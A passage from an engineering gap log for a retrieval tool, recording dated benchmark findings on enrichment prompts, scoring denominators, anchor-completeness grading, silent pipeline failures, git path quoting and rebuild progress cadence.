still at zero is the five-seed budget of G10, which the seat has to compete in and which cost one
recorded paraphrase to enter (S2). The next attempt moves seats or expansion — seating by agreement
between lists, or naming a seed's already-ranked document neighbours on the expanded line, both
G10's untried shape — not the admission. **Gate.** `where` above 0/9 in both arms with the recorded
suite's counts unchanged in both, which is the clause the seat failed; a wider seed budget is
allowed to be the lever and pays ADR-001's price for more seeds on its own terms. Not tried in that
shape.

**Status (2026-09-06, 0.5.0): the charged denominator moved the table, not its decisions.**
Regenerated on `bc-a1` under rule R's `attainable` and pasted whole in `$M/t3-g13.md`, the 27 rows
keep their code-list ranks and their `ratio`, `peak` and `z` columns unchanged, while the
`coverage` column falls on 19 of them, rises on 5 and holds on 3; the rows clearing the document
constant 0.761 fall 14 → 8. That is correct by the form's own logic — a Russian prose query's terms
are mostly absent from a code index, and the charged denominator charges that index for them
instead of dropping them — and it is why `c_code` was derived under the charged form rather than
inherited. At 0.902 the five rows above the cut are the same five as before, and two more print
0.90 in both columns, which two decimals cannot separate from the constant. What is open is whether
a code list should be scored against a denominator of its own: the document constant and the code
constant now sit 0.141 apart on the same form, and nothing measures whether that distance is the
two query populations differing or the two indices' vocabularies. **Gate.** A code list scored
against the idf its own index could attain, its constant derived on the mixed set before either
suite is opened (G17), reproduces the seat's `where` 0/9 → 2/9 and the code held-out 54 → 122 and
40 → 115, and either leaves the S2 paraphrase case standing or names the case it costs instead. Not
measured.

## G14 · The enrichment prompt does not know the document's kind

**Raised (2026-09-05)** by D1, the strongest paraphrase lever this campaign measured and one it did
not ship. The documents' questions regenerated by sonnet instead of haiku — 1,996 nodes, 27,394
questions at a median of 13 a node, 1,283 s, ≈ $13.62 estimated from characters against ≈ $2.50 on
haiku — read paraphrase 17/30 and 16/30 against 15/30 and 14/30 and held-out 103 → 132 (+46 −17,
p = 0.0003) and 109 → 128 (+45 −26, p = 0.032), both arms significantly better. It fails the third
rule on one kind: the developer suite's `rule` questions go 5/9 → 2/9 in both arms — `ADR-005`,
`ADR-031`, `INV-07` and `INV-10` lost, `ADR-003` gained — which takes the `--no-dense` arm 37 → 36
and the whole lever out of the default.

**Candidate cause, and the diagnostic is cheap.** `enrich` asks the same
twelve-questions-plus-synonyms prompt of a requirement, an ADR and an invariant alike; the four
answers lost are two ADRs and two invariants, and the one gained is an ADR. Read the sonnet and
haiku questions for `ADR-005`, `ADR-031`, `INV-07` and `INV-10` side by side before designing
anything: either the sonnet lines drift towards "where do I find this" where the case asks "is this
allowed", or the cause is elsewhere and a per-kind prompt is the wrong lever.

**Lever.** A prompt per node kind: for ADR and INV documents, questions of the "is this allowed /
what forbids it" shape rather than "where do I find this". Measured under the same three-way rule,
on the same generator, so the prompt and the model are not changed in one step. A larger model is
not the next step — opus only if a kind-aware sonnet still falls short.

**Gate.** `rule` back to 5/9 or better in both arms with the paraphrase and held-out gains kept, and
the recorded floors held. Until then `ENRICH_COMMAND` stays haiku; `enrich_command` is per-store
configuration, so a store that wants sonnet's paraphrase recall today can have it in one line of
`repograph.toml`, at roughly five times the token cost.

**Status (2026-09-05, 0.5.0): the stated cause is measured and does not hold; the gap stays open.**
The free diagnostic this gap asked for was run and stopped the lever before any prompt was written
or any token spent. Haiku's and sonnet's questions for `ADR-005`, `ADR-031`, `INV-07` and `INV-10`
were read side by side and each line counted rule-shaped or behaviour-shaped: sonnet carries fewer
rule-shaped questions on 1 of the 4 lost nodes, against a pre-registered bar of 3 of 4. Because a
hand count was deciding a lever, a second reader classified the same two files without seeing the
first count or the plan and read 2 of 4. The two disagree on absolute counts and agree where it
matters — `ADR-031` moves as G14 predicted, `ADR-005` and `INV-07` move the *wrong* way, sonnet
asking *more* permission-shaped questions there. So the prompt's shape is not the difference the
questions show, and the next attempt should read the retrieval side of those four nodes before
writing a prompt. `ENRICH_COMMAND` stays haiku for the reason it always did, which is the developer
suite and not this diagnostic. Both counts, question by question, are in
[the 0.5.0 gap results](2026-09-05-0.5.0-gaps-results.md), L4.

**Status (2026-09-06): the retrieval side read, three hypotheses dead, a cause named.** The second
reading this gap asked for was run against the shipped 0.5.0 binary at no model-token cost
([the second G14 diagnostic](2026-09-06-g14-second-diagnostic.md)). The coverage admission does not
recover the loss — D1 under it reads `rule` 2/9 in both arms still, the same four nodes falling, and
the questions list is admitted in every one of the nine cases. Query length is not it: `rule` is the
shortest kind in the suite. Nor is a generator scattering permission questions everywhere: they are
9.5% of one set's questions and 10.2% of the other's. What the dumps show is the expected node
losing its **rank inside the questions list** — median 3 → 10 for `rule` while `long` goes 1.5 → 1 —
because its own score falls as the field rises. The cause is **register**: one generator writes a
node's questions in the asker's colloquial voice, the other in the document's own precise one, and
the share of a query's words found in its node's questions moves −29% for `rule` and +32% for
`long`. The `rule` cases are the only ones written in a developer's permission-asking voice, and the
only ones that lose. None of this is a property of a particular model — it is a property of the
register the prompt asks for, which is why `enrich_model` is configuration and the lever is a prompt
instruction rather than a model choice. So the lever this gap proposes is aimed wrongly twice: the
shape is already written, and shape is not what retrieval lost. Merging both registers into one
store, at no model tokens, then read paraphrase **20/30** in both arms against 15 and 17/16, `rule`
back to 5/9 dense and **7/9** lexical, developer totals 43 and 45 against 38, and held-out 104 → 141
and 112 → 153 at p = 0.0000 — every kind at or above the better single register, `where` still 0/9
because it needs a seat and not a prompt. That reading is exploratory: no rule preceded it and the
held-out set favours any store holding the colloquial questions, so it ships nothing. The first
thing to try is one generator asked for both registers; the results document carries the clauses a
pre-registered attempt should commit first.

**Status (2026-09-06, 0.5.0): the lever this gap proposed is retired; the successor is measured and
rejected.** L4 as framed — a prompt per node kind asking for "is this allowed" questions — is
retired on the record: it failed its own diagnostic gate on both readings, 1 and 2 of 4 against a
bar of 3, and the second diagnostic showed it aimed at shape where the loss is register.
`src/enrich.rs` was never changed for it and no token was spent on it. The successor was: the
documents' prompt asked one generator for six questions in the asker's voice and six in the
entry's, run on the default enricher over a fresh copy of the fixture's store — 1,996 nodes,
24,816 questions, ≈ $4.16 estimated. Under a rule committed first it fails four of six clauses.
`rule` reads **2/9 in both arms** against the fixture's 5/9, paraphrase 13/30 against 15/30 in
both, the dense arm breaks its paraphrase floor and `bench` exits 1, and nothing the lever exists
for moved. The neutral held-out set built from a third generator's questions is a wash in both arms
(p = 0.63 and 0.92) and the replay agrees with the binary, so the store behaves; it simply answers
less well. The register-share table says why: asking one generator for both registers did not raise
the `rule` share toward the fixture's 0.211 — it fell to **0.147**, below both stores. Splitting
twelve questions into six and six halved the room the entry's own vocabulary had rather than adding
the asker's voice. The prompt is reverted and the store kept. What remains untried is the union of
two generators' stores, which read paraphrase 20/30 and `rule` 7/9 with no rule in front of it —
[the residue, the seat and the register](2026-09-06-residue-seat-register-results.md), rule G.

**Lever (2026-09-06), named by the failure above.** Adding a register is not splitting a budget,
and the prompt that was measured split one: twelve questions became six in the asker's voice and
six in the entry's, and `bc-r1` carries 24,816 questions at a median of 13 a node against the
fixture's 26,117 at 13 (`$M/t6-survey.txt`) — the same twelve-question budget a node, divided
rather than enlarged. The `rule`
register share read the cost, 0.211 → 0.147 (`$M/t6-register-share.txt`). The instruction the next
attempt gives is six *more* questions, not six *instead of* six: the twelve the shipped prompt asks
for, unchanged, plus a second block in the asker's voice — a larger store on the same generator,
and a larger bill. **Gate.** Rule G's six clauses as written, plus one this attempt commits before
it runs: the `rule` register share at or above the fixture's 0.211 in `$M/t6-register-share.txt`'s
form, since a lever whose own mechanism moved the wrong way is answered before a suite is opened.
Not measured — the store it would build does not exist. The union of two generators' stores stands
where it stood: paraphrase 20/30 and `rule` 7/9, the only reading in this line that has moved
anything upward, two stores rather than one prompt, and still no rule in front of it. Pre-registering
it means naming its held-out set first, because the fixture's own favours any store that holds the
colloquial questions.

## G15 · An answer lost two of its three anchors and stayed HIT — `multi` 3/3 → 1/3

**Raised (2026-09-06)** by rule R's own per-case reading, which that rule allowed for and did not
judge. Under the shipped charged denominator seventeen cases changed the answer they return with no
case changing its verdict (`$M/t3-case-token-moves-all.txt`). One of them got thinner: the
developer case `FR-APP-40+FR-APP-47+FR-AI-09` (`multi`) reads `HIT 3/3` before and `HIT 1/3` after
in both arms, and it is the only case in either suite in either arm whose completeness moved at all
(`$M/base-bench-{rec,dev}-{dense,lexical}-full.txt` against the `t3-` eight). In the lexical arm
all three anchors were seeds and `FR-APP-40` and `FR-AI-09` left them; in the dense arm `FR-APP-40` left the
seeds and `FR-AI-09` left the expanded line, so the answer names one anchor of three in both
(`ask` in `$M/base-dev-{dense,lexical}.json` against `$M/t2-dev-{dense,lexical}.json`).
`FR-APP-47` is still seated and one anchor reached is a hit (`src/bench.rs:85`), so the case scores
exactly what it scored before.

**What the suite prints and what it grades.** The per-case line already carries completeness —
`{reached}/{want}` at `src/bench.rs:336`, which is where the `3/3` and the `1/3` above were read.
Nothing above that line reads it: the summary counts cases (`multi 10/12`), every floor is a count
of cases, and `bench`'s exit code is those floors. Rule R's clause 6 required the four recorded
arms' counts to be identical and they were; no clause any campaign has written so far has anything
to say about an answer that keeps its verdict and loses two thirds of its content.

**The same seventeen cases moved the other way too.** In the lexical arm `FR-PAY-110`, `FR-PAY-28`
and `FR-SVC-50` each moved from seed 2 to seed 1, displacing an id the case does not expect
(`FR-CAL-139`, `FR-CAL-55`, `FR-CRM-09`), and `FR-TOOL-35` moved from seed 4 to seed 1
(`$M/base-{rec,dev}-lexical.json` against `$M/t2-{rec,dev}-lexical.json`). The instrument is blind
to those gains for the reason it is blind to the loss: the anchor was reached before and is reached
now, and a count of cases cannot say at what rank or how completely.

**This is G10's shape, not a retrieval one.** Nothing here is a document that could not be found.
`FR-APP-40` and `FR-AI-09` are ranked; five seeds and a one-hop expansion are what they no longer
fit into, which is the constraint G10 named and priced. What this gap adds is that the suite cannot
report it — so a lever that trades an answer's completeness for its coverage reads as free.

**Lever.** Grade what the case line already prints: `bench`'s summary carries a reached-over-wanted
anchor total per kind beside the case count, in both suites and both arms, and a campaign's rule
can then require it not to move the way it requires the counts not to move. Whether that total
becomes a floor is for the first reading that has a baseline to set one from, not for this gap — a
floor set on one campaign's numbers is the mistake ADR-001 exists to record.

**Gate.** The four arms re-run at `868f4c1` reproduce every case count and p90 exactly and record
the per-kind anchor totals as the baseline, the change being measurement only and moving no floor;
and the next campaign's rule names those totals among the counts that must hold. Not measured — the
two readings above were taken case by case out of two `-full` files, not from anything `bench`
reports.

**Implemented 2026-09-09; the baseline is the next run's.** `Summary` carries `anchors` beside
`by_kind`, filled by one `record(kind, hit, (reached, want))` in the per-case loop — the same
`(reached, want)` the case line has always printed and nothing has ever read — and printed on an
`anchors` line of its own beneath the summary. Of its own on purpose: `bench/history/track.py`
parses the summary line with a regex of `<kind> <hits>/<cases>` pairs, and every transcript this
campaign has recorded is read back through it, so a column added *inside* that line would have made
this measurement retire the history it exists to extend. The summary line is byte-identical to the
record. `passes()` is untouched and no floor moved:
this ships as a column, which is what ADR-001 asks of a number nobody has a baseline for yet.
`bench --repeat N` runs the suite N times and prints a median beneath the runs, every run still
judged on its own floors — a suite that passes on average is one whose exit code depends on which
run a reader looked at. That half is G23's first lever; the pinned-index and quiet-machine halves
are not written.

**The baseline, read on the pinned fixture at `aea8416` (2026-09-09).** Every recorded count and
p90 is identical to the record, which is what makes these four lines a measurement and not a change:

| suite | arm | counts | anchors |
| --- | --- | --- | --- |
| recorded | lexical | keyword 39/40, paraphrase 15/30, code 12/12, p90 215 | 39/40, 15/30, 12/12 |
| recorded | dense | keyword 40/40, paraphrase 15/30, code 12/12, p90 221 | 40/40, 15/30, 12/12 |
| developer | lexical | long 11/15, cross 13/15, multi 9/12, where 0/9, rule 5/9, p90 239 | 11/15, **13/30**, **16/39**, 0/13, 5/9 |
| developer | dense | long 10/15, cross 13/15, multi 10/12, where 0/9, rule 5/9, p90 239 | 10/15, **13/30**, **13/39**, 0/13, 5/9 |

The recorded suite's cases are single-anchor, so its two columns are the same number twice and
always will be. The developer suite is where the instrument was blind, and the first reading says
how blind: `cross` reads 13 of 15 cases and **13 of 30 anchors**, `multi` 9 or 10 of 12 cases and
**16 or 13 of 39 anchors**. A lever that trades an answer's completeness for its coverage has been
free to move those numbers in either direction under every rule any campaign has written. Note the
dense arm reaching *more* `multi` cases and *fewer* of their anchors than the lexical one — a trade
no count in this file has ever been able to state.

## G16 · `enrich` reported 167 batches, 0 failed, and no questions

**Raised (2026-09-06)** by rule G's first attempt, which spent nothing and was caught by a person
reading a log. The plan's `enrich_command` carried `--no-session-persistence`; the installed CLI
(2.0.35) has no such option, printed an unknown-option error to stderr and exited without reading
stdin. `enrich` reported `0 nodes written, 0 dropped, 1996 still without questions, 167 batches
(0 failed) in 33s`, then `dense: embedded 0 rows in 0.0s`, and exited 0, leaving a 0-byte answer
file and 5,285,406 tee'd prompt bytes that never reached a model (`$M/t6-enrich-attempt1.log`,
`$M/task6.txt`, `$M/t6-cost.txt`).

**Cause, and it is three places.** `run_command` does bail on a non-zero status
(`src/enrich.rs:266`), but the configured command is a shell pipeline and `sh -c` returns the
status of its last stage — here a `tee` — so the generator's failure never reaches that check. The
empty answer then parses to no questions for any node in the batch, which is the *skipped by the
model* path: the batch is retried once and then counted as done (`src/enrich.rs:310`). `failed`
counts only `run_command` errors, which is why the report says 0 failed of 167. And `enrich` prints
`left` and returns `embed_all` (`src/main.rs:374`), so a run that wrote nothing exits 0 like a run
that wrote everything. The unit tests state the current behaviour rather than miss it:
`nodes_a_model_answer_skipped_are_asked_once_more` asserts `(generated, left) == (0, 2)` on an
answer that skips every node, and asserts nothing about `failed`.

**What it cost and what it would have cost.** Nothing, three times over: the failure was total, it
was at the start of a fresh copy, and the operator read the log before the next step. None of the
three places depends on any of that. A generator that dies partway — a rate limit, a wrapper that
exits, a flag rejected only for the batches carrying a longer prompt — writes a partially enriched
store, reports it as a completed run with 0 failed, exits 0, and hands the campaign a store it will
grade against the fixture as though the prompt were the only variable between them. Rule G's whole
verdict rests on `bc-r1` being fully enriched; the one line of output that would have said
otherwise is `left`, which is printed and acted on by nobody.

**Lever.** A generator that exits non-zero or returns nothing is a failure, not non-coverage. Run
the configured command under a shell that propagates a pipeline's failure; count a batch whose
answer parses to nothing for every node as failed once its retry has also come back empty; and let
`enrich` exit non-zero when it was asked to write nodes and `left` is above zero. The middle one is
load-bearing — a pipeline's exit status is the operator's to get right, an empty answer is nobody's
to mistake for one.

**Gate.** Two stub commands in `src/enrich.rs`'s own test module: one that fails mid-pipeline
(`sh -c 'false | cat'` exits 0 today), one that exits 0 with empty stdout, each counted as a failed
batch and each making `enrich` exit non-zero; `nodes_a_model_answer_skipped_are_asked_once_more`
keeps its retry assertion and gains a `failed` one. The fixture's four arms at `868f4c1` are
unchanged, the change reaching no path `bench` reads. Not written.

**Closed (2026-09-09), all three places.** `run_command` prefixes `set -o pipefail; ` when the
shell has it — probed once per process, because POSIX `sh` does not and Debian's `dash` is one; a
batch whose retry also answers for nobody is counted `failed` rather than done; and `enrich` bails
when `failed > 0 && generated == 0`. The last condition is deliberately not `left > 0`: a store
legitimately keeps the nodes a model declines (63 on this corpus), and every honest run would
otherwise exit red. Three tests in `src/enrich.rs` — `false | cat`, `cat > /dev/null`, and the
retry test's new `failed` assertion — plus a hand run reproducing the original shape:
`enrich: 0 nodes written … 1 batches (1 failed)`, then `Error: … the generator did not answer`,
exit 1. No path `bench` reads was touched, so the four arms were not re-run.

**The same run's price is an estimate checked against an estimate.** The register enrichment is
recorded at ≈ $4.16 — tee'd bytes 2,647,761 prompt and 2,795,432 output, at bytes ÷ 4 and Haiku 4.5
list rates (`$M/t6-bytes.txt`, `$M/t6-cost.txt`) — against the ≈ $2.50 the plan predicted, which is
D1's per-corpus haiku figure carried forward and computed the same way. The two sit 1.66× apart on
the same generator over the same 1,996 nodes, and nothing in the record says whether the volume
moved (24,816 questions against the fixture's 26,117, `$M/t6-survey.txt`) or the bytes ÷ 4
conversion is wrong, because no run in this line has recorded the generator's own reported token
counts. G14's ≈ $13.62 for the stronger generator's reading is the same character-derived estimate
of a run nobody metered: the multiple a reader takes from "roughly five times the token cost" is
5.4× against $2.50 and 3.3× against $4.16, and no measurement separates them. **Lever.** `enrich`
records what the generator reports — its usage line, where the command's output format offers one —
so a price is a measurement rather than a division. **Gate.** The next enrichment writes a
per-batch token record and its cost paragraph cites that instead of `wc -c`, with the bytes ÷ 4
figure kept beside it for one run so the two methods are compared once. Not measured.

## G17 · The constant is derived on a set the same plan invented

**Raised (2026-09-06)** by rule S, whose order of operations held and which leaves this standing
anyway. `c_code = 0.902` is the crossover of an 800-question mixed held-out set — `bc-a1`'s 400
document questions, byte for byte the fixture's, and 400 of its 3,463 code entries — taken at
15:23:29, ten seconds before `score` opened a suite, and written to a file first
(`$M/t4-crossover-code.txt`, `$M/t4-constant-code.txt`). The mix is the one judgement in that
procedure, and
[the design note](../superpowers/specs/2026-09-06-residue-seat-register-design.md) fixes it at
equal halves before any dump was taken, saying so and saying it does not know the true share: the
developer suite is 24 file-anchored questions of 60 and the recorded suite 12 of 82.

**What is weak, and it is not the order.** The document held-out set carries no such judgement —
`bench/heldout.py` draws it from the store's own questions at a recorded seed. The mixed set is the
first population in this line that a plan authored, at a share that plan chose, to derive the
constant judging that plan's own lever. Pre-registration answers *when* the constant was fixed and
says nothing about *what it was fixed on*. Under equal halves the split separates well — above the
cut the code list holds the answer in its top five 40% of the time against the passage list's 10%,
below it 2% against 25% (`$M/t4-crossover-code.txt`) — and at the suites' own file-anchored share,
roughly a third, the two populations are weighted differently and the crossover moves by an amount
nothing measured.

**Lever.** Derive the constant at three mixes named before any dump is read — the suites' observed
file-anchored share, equal halves, and the code set's share of the store's own eligible nodes
(3,463 code against 1,996 document) — and report the clause outcomes at each. A verdict that is the
same at all three is a property of the query; one that moves is a property of a number the plan
chose, and the plan then says which mix it takes and why, in front of the suites rather than after
them.

**Gate.** The next code-seat attempt writes `c_code` at three pre-registered mixes to a file before
`score` runs, and its verdict paragraph reads every clause at each. If S2 — recorded lexical
paraphrase 15/30 → 14/30 — fails at all three, the mix is not why the seat did not ship and this
gap closes on the record; if the verdict moves, the seat was decided by a constant's population.
Not measured; the sensitivity was never read, on this constant or on `QUESTIONS_GATE`'s 0.761,
whose own second population G8 records as never built.

---

## G18 · A path with one non-ASCII byte makes its whole file invisible to `changes` — closed 2026-09-09

**Raised (2026-09-07)** by the Windows port's CI work, not by a run. `core.quotepath` is on by
default, so `git diff` quotes any path outside ASCII: a Russian-named file's header comes back as
`+++ "b/docs/\320\250\321\202\321\200\320\260\321\204.ts"`, with the quote *before* the `b/`.
`parse` takes the new-side name as `p.strip_prefix("b/")` (`src/changes.rs:19`), which is `None` on
that line, and the `let Some(f) = &file else { continue }` three lines down then drops every hunk
in the file. Reproduced on a scratch repository here, both symptoms below.

**Two symptoms, one cause.** A tracked file is dropped in silence, and Task 2's fallback cannot
save it: `touched` reports `file:<name>` for a file the graph never indexed
(`src/changes.rs:51`), but that needs a hunk, and no hunk was ever built. This is G1's silence
returning through a door Task 2 did not close. An untracked file arrives the other way —
`git ls-files --others` quotes too, so the escaped name reaches `hunks_from_git`
(`src/changes.rs:154`) intact and is printed as `file:"docs/\320\235\320\276\320\262…"`: visible,
matchable against nothing, and wrong on the screen.

**What it cost, and why that is checked rather than assumed.** Nothing measurable. `git ls-files`
on the pinned fixture `beauty-crm-502e8a6d` returns **0** paths with a byte outside ASCII, so no
`changes` number in this file — G1's 27/38, Task 2's 498/498 — was ever computed over a path that
could trigger it. That corpus is Russian in its content and ASCII in its paths. A corpus that is
not, or a single branch that adds one such file, loses that file's symbols from a blast radius
with no line saying so — which is the failure `changes` exists in order not to have.

**Lever.** Ask git not to quote: `-c core.quotepath=false` on the two invocations `git()` makes
(`src/changes.rs:144`), which puts UTF-8 on the wire and leaves every ASCII path byte-identical. A
parser that unescapes the quoted form instead is the same behaviour at more code, and would still
have to decide what a lone `\377` means.

**Gate.** Two tests in `changes.rs`'s own module: a diff whose header is quoted, asserting the hunk
is found under the unescaped name, and an untracked quoted name from `ls-files` reported as itself.
Then the fixture, which must read what it reads today byte for byte, since none of its paths
changes form. Both written.

**Closed (2026-09-09).** The lever as written: `-c core.quotepath=false` on the invocations `git()`
makes, one argument in the one place both callers pass through. The two tests build a scratch
repository that pins the quoting *on*, so a machine that turns it off globally cannot make them
pass against the unfixed binary, and pins signing, hooks and the global exclude file so that no
personal configuration can fail them for something that is not quoting. A tracked `docs/Штраф.ts`
read no hunk at all and reads its own name now; an untracked file read its escaped name and reads
itself. The untracked test's name is chosen without a decomposable letter, so a filesystem that
hands back the decomposed form cannot fail it for a difference that is not the one under test.

**Three more, from a review of the fix.** The argument alone left two ways for the same silence to
return, and one for a test to be run against the wrong repository:

- The argument reaches the bytes above ASCII and no further. A name holding a newline, a quote or
  a backslash is C-quoted either way, so the untracked listing still handed on `"docs/a\nb.ts"`,
  quotes and escape intact, matching nothing — the same silent mismatch under a different class of
  byte. The listing is asked for NUL-separated now, which removes the quoting rather than
  disabling half of it. Inert where it is not needed: on the pinned fixture and on this repository
  the two listings are identical, and neither holds a tracked path with a byte outside ASCII. It
  also takes the untracked half out of the argument's hands — with the argument removed the
  tracked test reads no hunk again, while the untracked one stays green.
- **The tracked half still loses those names.** `git diff`'s header quotes a control character
  whatever `core.quotepath` says, verified against real git: `+++ "b/a\nb.ts"`. `parse` reads no
  name from it and drops every hunk in the file, in silence, which is this gap's own failure under
  a class of byte it did not name. Closing it means a parser that unescapes the quoted form, or a
  name list of its own from `--name-only -z` — the first is what the lever above declined, and
  neither is one argument.
- A hook exports its own repository into everything it runs and those variables outrank `-C`, so
  `changes --repo X` started from one was reading the hook's repository rather than the one it was
  given. The object store is in that set: cleared of the repository and the index but not of it,
  a temporary repository writes its objects into the hook's. All six are dropped, in `git()` and
  in both test helpers.
- The identity the fixture uses is now written twice, here and in `users_day.rs`, comment and all.
  Left as it is: sharing it across a binary's unit tests and an integration target needs a
  test-support module this crate does not have.

**What the argument does not reach.** Two paths still lose their file in silence, for reasons this
gap did not name and this fix does not close:

- **A path whose bytes are not UTF-8.** With the quoting off they arrive raw, and `git()` decodes
  its output lossily, so each such byte becomes a replacement character and the name matches no
  node. The escaped form was equally unusable, so nothing regressed — what closed is the UTF-8
  case. The lever is `OsString` on both sides, which is the "what does a lone `\377` mean"
  question this gap declined once already.
- **Composition.** The graph's names come from the walk and these come from git, which normalises
  to the composed form on macOS by default, so a tree holding decomposed names gives a hunk name
  byte-different from the node name for the same file. The tests dodge it by choosing their
  letters; a real corpus cannot.

The unit module also needs a `git` binary now, where every other test in it runs on strings alone.

## G19 · The progress line's cadence is a count of rows — first line at 102.4 s against a 60 s bar

**Raised (2026-09-07)** by the rebuild the first resource run bounded
([what every command costs](2026-09-07-resource-usage-results.md), §4.1). Every other fixed number
that run set was met; this is the one that was not.

**Measured.** The whole-store rebuild prints thirty-three progress lines where there were none. The
first lands at **102.4 s** and the thirty-two after it are **42.7 s to 96.7 s apart, mean 57.0**,
against a bar of one line at least every 60 s. The mean clears the bar and neither tail does.

**Cause.** `SYNC_CHUNK` (`src/main.rs:336`) is 1,024 **rows**, and a row is not a unit of work.
Both tails follow from that. The first chunk carries the run's fixed startup — 2.24 GB of
memory-mapped fp32 weights paged in as the first forwards touch them, which is also why chunks two
and three are still decaying at 60.1 s and 46.4 s — and the last chunks are slow because the
graph's iteration order puts the long passages last: 96.7 s for the thousand rows ending at 32,768.

**Lever.** Budget a chunk by tokens, the way `token_batches` (`src/index/embed.rs:297`) already
budgets a forward against `TOKEN_BUDGET`, so a checkpoint measures the same thing a batch does.
Shrinking the count is not the lever and the recorded chunk times say so: 102.4 s less a settled
chunk's 46.4 s leaves about 56 s of fixed startup before a single row could be checkpointed, so
halving `SYNC_CHUNK` still prints the first line after 60 s. That subtraction is arithmetic on the
recorded numbers, not a run.

**Gate.** On the same whole-store rebuild, every interval under 60 s including the first, with the
run's own readings unmoved — 1,930 s wall, 293% peak CPU, 2.15 GB.

**Measured 2026-09-09, and the premise is gone.** A whole-store embed on a copy of the pinned
fixture (33,525 rows, 384-d, the small model) reads **184.7 s** of sync, 680.9 s of CPU and 1.74 GB
of max RSS — not 1,930 s. The band is why: `76f1049` removed it and every writer runs in the normal
one, so the 102.4 s first line and the 96.7 s tails this gap was raised on were properties of a
scheduler setting that no longer exists. The control makes it plain: interpolating the recorded run
back onto a fixed 1,024-row cadence, the old chunking **would have printed its first line at 9.4 s
and its widest interval at 9.4 s** on today's binary. The bar was already met.

**Closed 2026-09-09, and the change kept anyway, for a reason the numbers give.** `SYNC_CHUNK` is
now a `ChunkBudget` — 600,000 characters, 1,024 rows, ramped in from a sixteenth so the first
checkpoint does not wait for a full chunk on top of the run's start-up — and `embed_all` prints the
model open before the first forward. Measured cadence: **36 checkpoints, first at 0.5 s, every
interval between 0.5 s and 8.3 s.** What keeps this from being a change for nothing is the tail and
the other model: the last chunks still run 8.3 s against a 5.1 s mean, because the graph's
iteration order puts the long passages last, and `e5-large` is about nine times this wall
([ADR-002](../adr/ADR-002-two-defaults-multiplied.md)), which puts those same tail chunks at
roughly **75 s — over the bar** under a fixed row count and inside it under a character budget.
That multiplication is arithmetic on two recorded numbers, not a run; the large-model cadence has
not been measured.

**One thing this run cannot be read for.** Its wall clock says 6,332 s real against 184.7 s of
sync, because the laptop slept in the middle of it. The intervals above are process time,
reconstructed from each checkpoint's own `rows` and `rows/s`, which a sleeping machine does not
advance. G23's point, on the run that closed G19.

## G20 · A whole-store rebuild in the background band has no wall number — closed 2026-09-09, moot

**Closed 2026-09-09 without a measurement, because there is nothing left to measure.** The band was
removed ([the plan](../plans/2026-09-09-normal-band-only.md)): there is no run to take, no ratio to
replace with CPU-seconds, and no setting that would produce one. The body below stays as the record
of why the number could not be got while the band existed — three whole-store attempts that starved
on a working laptop is itself part of the case for removing it. What replaced the band's numbers is
[the 2026-09-09 results](2026-09-09-normal-band-only-results.md), which measures the default model's
whole store at all three `resources` levels in the normal band.

**Raised (2026-09-07)** by
[a rebuild measured against the person at the keyboard](2026-09-07-unnoticeable-results.md), §4.4 —
the one row that document's plan asked for and could not take.

**Measured.** Nothing, which is the gap. Three whole-store attempts and no end-to-end reading: the
plan's own run, on the pre-change binary, was stopped deliberately at 7,168 of 33,525 rows after
34.7 minutes; the shipped binary's run was then started twice and starved both times, the second
managing **80.9 seconds of CPU in 15.5 minutes** without reaching its first checkpoint, under a
load average that had peaked near 200 with an Android emulator (5.5 GB), Android Studio (4.0 GB),
two JVMs, `lldb-rpc-server` (4.2 GB), Xcode and Chrome on the machine and 64 MB of free pages. A
third was left running detached when the document was written and its line is not in it. The in-run
probes did land, at t = 60–100 s of the first attempt, and they are the only whole-store probe
readings there are: every thread at PRI 4, P6 2,714 ms (+5.0%) — on bar 1, not under it — P1 2,511
(+0.7%), W p99 512–626 µs.

**Cause, and it is the feature rather than a fault.** `sample` puts the starved process inside ONNX
Runtime's thread pool doing forwards, not blocked on a lock or on I/O. It is not the store's size
either, and a control says so: store-B, the 320-row copy V1 and V3 each finished in 11 minutes on a
quiet machine, was started again in the band under the same afternoon's load and read **81.4 s of
CPU in 8.1 minutes** — 17% of one core against V1's 231%. The background band on Apple Silicon is
the efficiency cluster, which is where macOS puts its own background work too, so the band's
throughput follows how busy those six cores are and not how busy the machine looks. Bar 6 says the
person does not wait for the rebuild; the other half of the same trade is that the rebuild waits
for the person.

**What stands in place of the number.** 4.1× to 4.5× the foreground 1,930 s — 4.1× is R2's wall
against R1's, 4.5× the first checkpoint's 2.2 rows/s against the foreground run's 10.0 — so roughly
2.2 to 2.4 hours, which is [the plan](../plans/2026-09-07-unnoticeable.md)'s ≈ 8,700 s if the rate
climbs the way the foreground run's did. It is a product of ratios and it is labelled as one
wherever it appears.

**Lever, and this gap has to pick one.** Record **CPU-seconds** rather than wall as the band's
cost: they are load-independent, they are already what V1 gives against R1 on store-B (2,315 s
against 576, a measured 4.02×), and they can be taken on this laptop today. Wall stays beside them
as an annotation carrying the load average it was read under, and the one wall figure meant to
travel is taken on a machine idle by construction — a run scheduled overnight against the pinned
fixture, which needs no rig. The alternative, waiting for a working laptop to fall quiet, is what
produced three unfinished runs.

**Gate.** One whole-store rebuild in the band with its CPU-seconds recorded and read against the
4.02× the band charges on store-B, and with bar 5 — the bytes a whole rebuild writes — taken from
the run rather than computed from file sizes as §4.4 had to (≈ 180 MB against a 300 MB bar). One
wall figure beside it, labelled with the load it was taken under.

## G21 · One machine is measured; three platform rows are reasoned from an API contract — closed 2026-09-09, moot

**Closed 2026-09-09 without a measurement.** The three reasoned rows described what the band did per
platform, and the band is gone: nothing in the binary names a scheduling class on any platform, so
there is no per-platform behaviour left to reason about or to test hardware for. The `resources`
key that replaced it is arithmetic on `available_parallelism` and is the same on all three. The body
below stays as the record of what was reasoned and how carefully it was labelled.

**Raised (2026-09-07)** by [the unnoticeable results](2026-09-07-unnoticeable-results.md), §5.1,
which labels every row of its hardware table measured or reasoned and leaves three of the four
reasoned.

**Measured.** macOS on Apple Silicon, and only there: R1 against V1 — PRI 4 on every thread, 100%
of the process's CPU time in the background band, 1.71 GHz against 3.49, the person's compile back
from +15.7% to +2.8%, the wake p99 from 2,469 µs to 564 µs. Windows is honest by construction:
nothing is implemented and one line on stderr tells the user the setting had no effect. The other
two rows are arguments.

The merge with `main` sharpens the Windows half rather than the reasoning: `cfd4c40` ships a
Windows binary, so the platform where the default setting does nothing and says so on every writer
run is now one the project releases to, not one it declines to claim. `SetPriorityClass` with
`PROCESS_MODE_BACKGROUND_BEGIN` is the call, and it also throttles that process's I/O, which is the
half `nice` alone never gives Linux.

**Cause.** The band is one system call, and the call means something different under each
scheduler. The Intel row is the one that matters most, because the same macOS binary runs there:
